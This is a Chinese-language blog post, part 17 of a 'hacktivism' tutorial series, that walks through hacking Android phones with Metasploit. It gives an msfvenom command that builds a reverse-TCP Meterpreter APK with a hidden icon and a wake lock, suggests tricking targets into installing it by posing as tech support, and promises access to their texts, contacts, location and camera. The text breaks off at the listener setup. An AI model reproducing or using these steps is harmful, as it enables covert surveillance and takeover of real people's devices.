---
layout: post
title: "尝试 Metasploit入侵Android移动设备：黑客主义行动力（17） - iYouPort"
date: 2021-06-22T16:04:14+00:00
author: iYouPort
from: https://www.iyouport.org/%e5%b0%9d%e8%af%95-metasploit%e5%85%a5%e4%be%b5android%e7%a7%bb%e5%8a%a8%e8%ae%be%e5%a4%87%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8817%ef%bc%89/
tags: [ iYouPort ]
categories: [ iYouPort ]
---

<article class="post-16313 post type-post status-publish format-standard has-post-thumbnail hentry category-knowledge-node category-289 category-54 tag-android tag-hacking tag-hacktivist tag-metasploit tag-technology tag-tools" id="post-16313">
 <header class="entry-header">
  <h1 class="entry-title">
   尝试 Metasploit入侵Android移动设备：黑客主义行动力（17）
  </h1>
 </header>
 <div class="entry-meta">
  <span class="byline">
   <a href="https://www.iyouport.org/author/gabrielfornard/" rel="author" title="由Gabriel Fornard发布">
    Gabriel Fornard
   </a>
  </span>
  <span class="cat-links">
   <a href="https://www.iyouport.org/category/knowledge-node/" rel="category tag">
    Knowledge Node
   </a>
   ,
   <a href="https://www.iyouport.org/category/%e6%8a%80%e6%9c%af/" rel="category tag">
    技术
   </a>
   ,
   <a href="https://www.iyouport.org/category/%e6%8a%80%e6%9c%af%e9%98%b2%e8%ba%ab-%e8%87%aa%e6%88%91%e4%bf%9d%e6%8a%a4%e6%96%b9%e6%b3%95/" rel="category tag">
    技术防身/自我保护方法
   </a>
  </span>
  <span class="published-on">
   <time class="entry-date published" datetime="2021-06-23T00:04:14+08:00">
    2021年6月23日
   </time>
   <time class="updated" datetime="2021-03-23T16:26:14+08:00">
    2021年3月23日
   </time>
  </span>
  <span class="word-count">
   1 Minute
  </span>
 </div>
 <div class="entry-content">
  <ul>
   <li class="graf graf--p">
    <span style="color: #00ccff;">
     <em>
      <strong>
       Metasploit致力于攻破任何系统，本文仅以安卓为例
      </strong>
     </em>
    </span>
   </li>
  </ul>
  <p class="graf graf--p">
   欢迎回来！
  </p>
  <p class="graf graf--p">
   如果您还没有读过前面的部分，在这里看到：
  </p>
  <ul class="postList">
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/mr-robot-%e5%a6%82%e4%bd%95%e6%91%a7%e6%af%81%e9%82%aa%e6%81%b6%e5%85%ac%e5%8f%b8%ef%bc%9f-%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%881%ef%bc%89/" href="https://www.iyouport.org/mr-robot-%e5%a6%82%e4%bd%95%e6%91%a7%e6%af%81%e9%82%aa%e6%81%b6%e5%85%ac%e5%8f%b8%ef%bc%9f-%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%881%ef%bc%89/" rel="noopener noreferrer" target="_blank">
     Mr.Robot 如何摧毁邪恶公司？- 黑客主义行动力（1）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/elliot-%e5%a6%82%e4%bd%95%e9%aa%87%e5%ae%a2%e9%82%aa%e6%81%b6%e5%85%ac%e5%8f%b8%e5%b9%b6%e4%bf%9d%e8%af%81%e6%97%a0%e6%b3%95%e8%a2%ab%e5%8f%8d%e5%90%91%e8%bf%bd%e8%b8%aa%ef%bc%9a%e9%bb%91%e5%ae%a2/" href="https://www.iyouport.org/elliot-%e5%a6%82%e4%bd%95%e9%aa%87%e5%ae%a2%e9%82%aa%e6%81%b6%e5%85%ac%e5%8f%b8%e5%b9%b6%e4%bf%9d%e8%af%81%e6%97%a0%e6%b3%95%e8%a2%ab%e5%8f%8d%e5%90%91%e8%bf%bd%e8%b8%aa%ef%bc%9a%e9%bb%91%e5%ae%a2/" rel="noopener noreferrer" target="_blank">
     Elliot 如何骇客邪恶公司并保证无法被反向追踪：黑客主义行动力（2）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a8%e9%9d%a2%e9%97%b4%e8%b0%8d%e4%bb%bb%e4%bd%95%e4%ba%ba%e7%9a%84%e6%99%ba%e8%83%bd%e6%89%8b%e6%9c%ba%e7%a7%81%e5%af%86%e6%b4%bb%e5%8a%a8%e2%80%8a-%e2%80%8a%e9%bb%91%e5%ae%a2/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a8%e9%9d%a2%e9%97%b4%e8%b0%8d%e4%bb%bb%e4%bd%95%e4%ba%ba%e7%9a%84%e6%99%ba%e8%83%bd%e6%89%8b%e6%9c%ba%e7%a7%81%e5%af%86%e6%b4%bb%e5%8a%a8%e2%80%8a-%e2%80%8a%e9%bb%91%e5%ae%a2/" rel="noopener noreferrer" target="_blank">
     如何全面间谍任何人的智能手机私密活动 — 黑客主义行动力（3）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%9c%a8%e9%9f%b3%e9%a2%91%e6%96%87%e4%bb%b6%e4%b8%ad%e9%9a%90%e8%97%8f%e7%a7%98%e5%af%86%e4%bf%a1%e6%81%af%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%9c%a8%e9%9f%b3%e9%a2%91%e6%96%87%e4%bb%b6%e4%b8%ad%e9%9a%90%e8%97%8f%e7%a7%98%e5%af%86%e4%bf%a1%e6%81%af%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b/" rel="noopener noreferrer" target="_blank">
     如何在音频文件中隐藏秘密信息：黑客主义行动力（4）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e7%a0%b4%e8%a7%a3%e8%93%9d%e7%89%99%e6%89%93%e5%bc%80%e7%9b%91%e7%8b%b1%e5%a4%a7%e9%97%a8%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%885%ef%bc%89/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e7%a0%b4%e8%a7%a3%e8%93%9d%e7%89%99%e6%89%93%e5%bc%80%e7%9b%91%e7%8b%b1%e5%a4%a7%e9%97%a8%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%885%ef%bc%89/" rel="noopener noreferrer" target="_blank">
     如何破解蓝牙打开监狱大门：黑客主义行动力（5）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e8%9e%8d%e5%8c%96-%e6%89%80%e6%9c%89%e5%80%ba%e5%8a%a1-%e5%a6%82%e4%bd%95%e6%9e%84%e5%bb%ba%e9%bb%91%e5%ae%a2%e6%a0%91%e8%8e%93%e6%b4%be-%e9%bb%91%e5%ae%a2%e4%b8%bb/" href="https://www.iyouport.org/%e8%9e%8d%e5%8c%96-%e6%89%80%e6%9c%89%e5%80%ba%e5%8a%a1-%e5%a6%82%e4%bd%95%e6%9e%84%e5%bb%ba%e9%bb%91%e5%ae%a2%e6%a0%91%e8%8e%93%e6%b4%be-%e9%bb%91%e5%ae%a2%e4%b8%bb/" rel="noopener noreferrer" target="_blank">
     ”融化” 所有债务 ……如何构建黑客树莓派 — 黑客主义行动力（6）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%85%85%e5%88%86%e4%ba%86%e8%a7%a3%e4%bd%a0%e7%9a%84%e6%94%bb%e5%87%bb%e7%9b%ae%e6%a0%87%ef%bc%9a%e8%bf%9b%e8%a1%8c%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e4%be%a6%e6%9f%a5%e7%9a%84%e7%ae%80%e5%8d%95/" href="https://www.iyouport.org/%e5%85%85%e5%88%86%e4%ba%86%e8%a7%a3%e4%bd%a0%e7%9a%84%e6%94%bb%e5%87%bb%e7%9b%ae%e6%a0%87%ef%bc%9a%e8%bf%9b%e8%a1%8c%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e4%be%a6%e6%9f%a5%e7%9a%84%e7%ae%80%e5%8d%95/" rel="noopener noreferrer" target="_blank">
     充分了解你的攻击目标：进行电子邮件侦查的简单方法 — 黑客主义行动力（7）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/wp-admin/post.php?post=13081&amp;action=edit" href="https://www.iyouport.org/wp-admin/post.php?post=13081&amp;action=edit" rel="noopener noreferrer" target="_blank">
     如何获取任何人的Wi-Fi密码而无需破解：黑客主义行动力（8）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%8f%91%e9%80%81%e6%ac%ba%e9%aa%97%e6%80%a7%e7%9f%ad%e4%bf%a1%ef%bc%9f-%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%889%ef%bc%89/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%8f%91%e9%80%81%e6%ac%ba%e9%aa%97%e6%80%a7%e7%9f%ad%e4%bf%a1%ef%bc%9f-%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%889%ef%bc%89/" rel="noopener noreferrer" target="_blank">
     如何发送欺骗性短信？- 黑客主义行动力（9）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a5%e4%be%b5%e7%9b%ae%e6%a0%87%e7%9a%84%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e5%92%8c%e9%93%b6%e8%a1%8c%e8%b4%a6%e6%88%b7%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a5%e4%be%b5%e7%9b%ae%e6%a0%87%e7%9a%84%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e5%92%8c%e9%93%b6%e8%a1%8c%e8%b4%a6%e6%88%b7%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c/" rel="noopener noreferrer" target="_blank">
     如何入侵目标的电子邮件和银行账户：黑客主义行动力（10）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e9%bb%91%e5%85%a5%e6%b1%bd%e8%bd%a6%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8811%ef%bc%89/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e9%bb%91%e5%85%a5%e6%b1%bd%e8%bd%a6%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8811%ef%bc%89/" rel="noopener noreferrer" target="_blank">
     如何黑入汽车：黑客主义行动力（11）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e6%8e%a7%e5%88%b6%e7%9b%ae%e6%a0%87%e4%ba%ba%e7%9a%84%e5%ae%89%e5%8d%93%e6%89%8b%e6%9c%ba%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8812%ef%bc%89/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e6%8e%a7%e5%88%b6%e7%9b%ae%e6%a0%87%e4%ba%ba%e7%9a%84%e5%ae%89%e5%8d%93%e6%89%8b%e6%9c%ba%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8812%ef%bc%89/" rel="noopener noreferrer" target="_blank">
     如何控制目标人的安卓手机：黑客主义行动力（12）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e8%87%aa%e5%8a%a8%e6%89%ab%e6%8f%8f%e6%98%93%e5%8f%97%e6%94%bb%e5%87%bb%e7%9a%84%e8%ae%be%e5%a4%87%e2%80%8a-%e2%80%8a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e8%87%aa%e5%8a%a8%e6%89%ab%e6%8f%8f%e6%98%93%e5%8f%97%e6%94%bb%e5%87%bb%e7%9a%84%e8%ae%be%e5%a4%87%e2%80%8a-%e2%80%8a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b/" rel="noopener noreferrer" target="_blank">
     如何自动扫描易受攻击的设备 — 黑客主义行动力（13）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a5%e4%be%b5%e5%ae%89%e5%8d%93%e6%89%8b%e6%9c%ba%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8814%ef%bc%89/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a5%e4%be%b5%e5%ae%89%e5%8d%93%e6%89%8b%e6%9c%ba%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8814%ef%bc%89/" rel="noopener noreferrer" target="_blank">
     如何入侵安卓手机：黑客主义行动力（14）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a5%e4%be%b5%e7%9b%91%e8%a7%86%e6%91%84%e5%83%8f%e5%a4%b4%e5%92%8c%e7%89%a9%e8%81%94%e7%bd%91%e8%ae%be%e5%a4%87%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8/" href="https://www.iyouport.org/%e5%a6%82%e4%bd%95%e5%85%a5%e4%be%b5%e7%9b%91%e8%a7%86%e6%91%84%e5%83%8f%e5%a4%b4%e5%92%8c%e7%89%a9%e8%81%94%e7%bd%91%e8%ae%be%e5%a4%87%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8/" rel="noopener noreferrer" target="_blank">
     如何入侵监视摄像头和物联网设备：黑客主义行动力（15）
    </a>
    》
   </li>
   <li class="graf graf--li">
    《
    <a class="markup--anchor markup--li-anchor" data-href="https://www.iyouport.org/%e8%89%be%e7%95%a5%e7%89%b9%e5%a6%82%e4%bd%95%e7%a0%b4%e8%a7%a3%e6%af%8f%e4%b8%aa%e4%ba%ba%e7%9a%84%e5%af%86%e7%a0%81%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8816/" href="https://www.iyouport.org/%e8%89%be%e7%95%a5%e7%89%b9%e5%a6%82%e4%bd%95%e7%a0%b4%e8%a7%a3%e6%af%8f%e4%b8%aa%e4%ba%ba%e7%9a%84%e5%af%86%e7%a0%81%ef%bc%9a%e9%bb%91%e5%ae%a2%e4%b8%bb%e4%b9%89%e8%a1%8c%e5%8a%a8%e5%8a%9b%ef%bc%8816/" rel="noopener" target="_blank">
     艾略特如何破解每个人的密码：黑客主义行动力（16）
    </a>
    》
   </li>
  </ul>
  <p class="graf graf--p">
   【注】此前我们上传过一本2021年的新书，您可以在这里下载《
   <a class="markup--anchor markup--p-anchor" data-href="https://www.patreon.com/posts/metasploit-5-0-41598345" href="https://www.patreon.com/posts/metasploit-5-0-41598345" rel="noopener" target="_blank">
    Mastering Metasploit: Exploit systems, cover your tracks, and bypass security controls with the Metasploit 5.0 framework, 4th Edition
   </a>
   》。Metasploit致力于攻破任何系统，本文仅以安卓为例。
  </p>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="596" data-image-id="0*5LjFJU2Hv6gR_al1.png" data-lazy-src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/0*5LjFJU2Hv6gR_al1.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="917" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/0*5LjFJU2Hv6gR_al1.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="596" data-image-id="0*5LjFJU2Hv6gR_al1.png" data-recalc-dims="1" data-width="917" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/0*5LjFJU2Hv6gR_al1.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   在过去的10年里，移动设备市场的增长非常迅猛。从2007年苹果手机的诞生开始，到2020年，移动设备已经占到所有网络流量的50%以上。地球上的移动设备使用数量约占世界人口的3/4。在这些移动设备中，75%使用Android操作系统。鉴于安卓系统在市场上的主导地位，将移动黑客攻击的重点放在这个占主导地位的操作系统上是非常合适的。
  </p>
  <p class="graf graf--p">
   本教程中将使用 Metasploit 来入侵Android设备，如平板电脑和手机。正如您所看到的，
   <strong class="markup--strong markup--p-strong">
    成功入侵后您就能够收集目标人的短信、联系人列表、位置、甚至打开他们的网络摄像头。
   </strong>
  </p>
  <p class="graf graf--p">
   截至2020年，恶意应用仍然是入侵安卓移动设备的最常见方法，近80%的攻击都是这些应用的结果。安卓用户越来越发现需要安装第三方应用，因为他们想尝试 Google Play 商店中没有的独特应用。
  </p>
  <p class="graf graf--p">
   安卓用户只需按照以下步骤，就可以启用第三方应用的下载和安装：
  </p>
  <p class="graf graf--p">
   1. 打开 Android 设备设置。
  </p>
  <p class="graf graf--p">
   2. 选择应用程序和通知选项。
  </p>
  <p class="graf graf--p">
   3. 启用 “未知来源” 选项，即可。
  </p>
  <p class="graf graf--p">
   注：如果您在应用程序和通知标签下找不到这个选项，那么请尝试在设备 “安全部分” 找到它。
  </p>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="652" data-image-id="1*Ahp2Hxw1GcHeODVwaNsphw.png" data-lazy-src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*Ahp2Hxw1GcHeODVwaNsphw.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="1346" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*Ahp2Hxw1GcHeODVwaNsphw.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="652" data-image-id="1*Ahp2Hxw1GcHeODVwaNsphw.png" data-recalc-dims="1" data-width="1346" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*Ahp2Hxw1GcHeODVwaNsphw.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   本教程将开发自己的恶意APK，然后必须诱导用户从第三方应用中安装、或由攻击者物理安装。
  </p>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     步骤1：寻找 Android 漏洞利用
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   第一步是搜索 Metasploit 寻找 Android 漏洞利用。
  </p>
  <p class="graf graf--p">
   在 Metasploit 中，有许多用于黑客入侵 Android 的漏洞。用以下方法快速搜索：
  </p>
  <pre class="graf graf--p">msf &gt; search type:exploit platform:android</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="804" data-image-id="1*CIpiCjaQcF5GQ1Y_kOr36w.png" data-lazy-src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*CIpiCjaQcF5GQ1Y_kOr36w.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="2356" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*CIpiCjaQcF5GQ1Y_kOr36w.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="804" data-image-id="1*CIpiCjaQcF5GQ1Y_kOr36w.png" data-recalc-dims="1" data-width="2356" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*CIpiCjaQcF5GQ1Y_kOr36w.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   如您所见，Metasploit中至少有12个针对Android操作系统的漏洞利用。
  </p>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     步骤2：寻找Android有效载荷
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   Metasploit有许多有效载荷，这些有效载荷是针对操作系统和漏洞利用的。如果要入侵Android系统，那么您将需要一个Android的有效载荷。
  </p>
  <p class="graf graf--p">
   您可以通过搜索找到Android特定的有效载荷：
  </p>
  <pre class="graf graf--p"><span style="color: #000000;">msf &gt; search type:payload platform:android</span></pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="686" data-image-id="1*Al3ZgCUz6UejNFgFVmJXtA.png" data-lazy-src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*Al3ZgCUz6UejNFgFVmJXtA.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="2590" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*Al3ZgCUz6UejNFgFVmJXtA.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="686" data-image-id="1*Al3ZgCUz6UejNFgFVmJXtA.png" data-recalc-dims="1" data-width="2590" src="https://i0.wp.com/cdn-images-1.medium.com/max/1067/1*Al3ZgCUz6UejNFgFVmJXtA.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   有许多Android特定的有效载荷，包括 payload/android/meterpreter/reverse_tcp，我们将在这里使用它，但其他的也可以使用。
  </p>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     步骤3：建立一个APK文件
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   入侵Android系统最简单的方法之一是创建一个.apk（Android PacKage）文件，并让目标将其安装到他们的Android手机或平板电脑上。这通常是通过物理访问他们的手机或通过
   <a class="markup--anchor markup--p-anchor" data-href="https://www.iyouport.org/category/%e5%bf%83%e7%90%86%e5%ad%a6%e5%92%8c%e7%a4%be%e4%ba%a4%e5%b7%a5%e7%a8%8b/" href="https://www.iyouport.org/category/%e5%bf%83%e7%90%86%e5%ad%a6%e5%92%8c%e7%a4%be%e4%ba%a4%e5%b7%a5%e7%a8%8b/" rel="noopener" target="_blank">
    社交工程操纵
   </a>
   （“你好，这里是技术支持。我们已经检测到您手机上的异常活动，需要安装一个技术支持应用来监测这一活动 ……” 等等，
   <strong class="markup--strong markup--p-strong">
    根据您对目标的具体情况的了解选取最有可能让其中招的方法。
   </strong>
   <a class="markup--anchor markup--p-anchor" data-href="https://www.iyouport.org/%e5%85%85%e5%88%86%e4%ba%86%e8%a7%a3%e4%bd%a0%e7%9a%84%e6%94%bb%e5%87%bb%e7%9b%ae%e6%a0%87%ef%bc%9a%e8%bf%9b%e8%a1%8c%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e4%be%a6%e6%9f%a5%e7%9a%84%e7%ae%80%e5%8d%95/" href="https://www.iyouport.org/%e5%85%85%e5%88%86%e4%ba%86%e8%a7%a3%e4%bd%a0%e7%9a%84%e6%94%bb%e5%87%bb%e7%9b%ae%e6%a0%87%ef%bc%9a%e8%bf%9b%e8%a1%8c%e7%94%b5%e5%ad%90%e9%82%ae%e4%bb%b6%e4%be%a6%e6%9f%a5%e7%9a%84%e7%ae%80%e5%8d%95/" rel="noopener" target="_blank">
    <strong class="markup--strong markup--p-strong">
     侦查永远是最重要的第一步
    </strong>
   </a>
   ）。
  </p>
  <p class="graf graf--p">
   您可以使用 Metasploit 中的 msfvenom 工具来创建自定义的有效载荷。在本案例中，我们将把 payload/android/meterpreter/reverse_tcp 转换为Android.apk文件。
  </p>
  <p class="graf graf--p">
   要做到这一点，请输入以下命令：
  </p>
  <pre class="graf graf--p">msf &gt; msfvenom -p android/meterpreter/reverse_tcp AndroidHideAppIcon=true AndroidWakeLock=true LHOST=192.168.1.101 LPORT=6996 -f raw -o HackersAriseMalwareApp.apk AndroidMalware.apk</pre>
  <figure class="graf graf--figure">
   <img class="graf-image aligncenter jetpack-lazy-image" data-height="416" data-image-id="1*M1s-07RdoxAbNMO7u282pQ.png" data-lazy-src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*M1s-07RdoxAbNMO7u282pQ.png?w=1100&amp;is-pending-load=1#038;ssl=1" data-recalc-dims="1" data-width="2728" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*M1s-07RdoxAbNMO7u282pQ.png?w=1100&amp;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/>
   <noscript>
    <img class="graf-image aligncenter" data-height="416" data-image-id="1*M1s-07RdoxAbNMO7u282pQ.png" data-recalc-dims="1" data-width="2728" src="https://i2.wp.com/cdn-images-1.medium.com/max/1067/1*M1s-07RdoxAbNMO7u282pQ.png?w=1100&amp;ssl=1"/>
   </noscript>
  </figure>
  <p class="graf graf--p">
   其中：
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    msfvenom
   </strong>
   创建恶意有效载荷的命令
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    -p android/meterpreter_reverse_tcp
   </strong>
   安卓有效载荷的名称
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    AndroidHideAppIcon=true
   </strong>
   该选项可以让攻击者隐藏应用程序的图标，不让用户看到
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    AndroidWakeLock=true
   </strong>
   这个选项可以防止手机进入 “睡眠” 状态
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    LHOST=192.168.1.101
   </strong>
   这是攻击者的IP地址（Kali）
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    LPORT =6996
   </strong>
   这是与攻击者通信的端口
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    -f raw
   </strong>
   这将创建原始格式 (-f)的有效载荷
  </p>
  <p class="graf graf--p">
   <strong class="markup--strong markup--p-strong">
    -o HackersAriseMalwareApp.ap
   </strong>
   k 这是要输出(-o)的应用程序的名称
  </p>
  <p class="graf graf--p">
   请注意，这个输出中会抱怨 “没有选择平台” 和 “没有选择arch”，但msfvenom 很聪明，可以从您选择的有效载荷中知道平台是Android，架构是Dalvik。
  </p>
  <p class="graf graf--p">
   关于如何使用 msfvenom 创建自定义有效载荷的更多内容可以参看
   <a class="markup--anchor markup--p-anchor" data-href="http://www.hackers-arise.com/single-post/2017/07/31/Metasploit-Basics-Part-9-Using-msfvenom-to-Create-Custom-Payloads" href="http://www.hackers-arise.com/single-post/2017/07/31/Metasploit-Basics-Part-9-Using-msfvenom-to-Create-Custom-Payloads" rel="noopener" target="_blank">
    这里的
   </a>
   教程。
  </p>
  <h3 class="graf graf--p">
   <span style="color: #339966;">
    <strong class="markup--strong markup--p-strong">
     步骤4：设置一个 Multi Handler 监听器
    </strong>
   </span>
  </h3>
  <p class="graf graf--p">
   现在您已经构建了嵌入Android有效载荷的.apk，需要在系统上打开一个监听器，当 HackersAriseMalwareApp.apk 安装并执行时，接受来自 HackersAriseMalwareApp.apk 的连接。
  </p>
  <p class="graf graf--p">
   您需要设置一个.rc脚本来自动启动并打开一个监听器以接受攻击者的 Metasploit 的外部连接。如果您已经这样做了，现在可以通过输入以下内容来启动它：
  </p>
  <pre class="graf graf--p">msf &gt; resource handler_http.rc</pre>
  <p class="graf graf--p">
   如果您还没有监听器脚本，可以通过输入以下命令来启动一个监听器：
  </p>
